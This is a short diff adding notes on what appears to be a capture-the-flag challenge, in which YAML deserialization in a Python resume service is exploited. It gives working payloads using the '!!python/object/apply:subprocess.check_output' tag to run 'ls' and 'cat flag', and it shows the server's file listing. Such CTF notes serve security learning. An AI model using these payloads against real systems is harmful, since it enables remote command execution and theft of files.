@@ -1,0 +1,10 @@
+Source: https://net-square.com/yaml-deserialization-attack-in-python.html
+
+profile:
+	name: !!python/object/apply:subprocess.check_output ["ls"]
+
+POST https://resume-yml.appsecil.ctf.today/resume
+	b'flag\nmain.py\nrequirements.txt\ntemplates\n'
+
+Cause error when "cat flag"
+name: !!python/object/apply:subprocess.check_output [["cat", "flag"]]
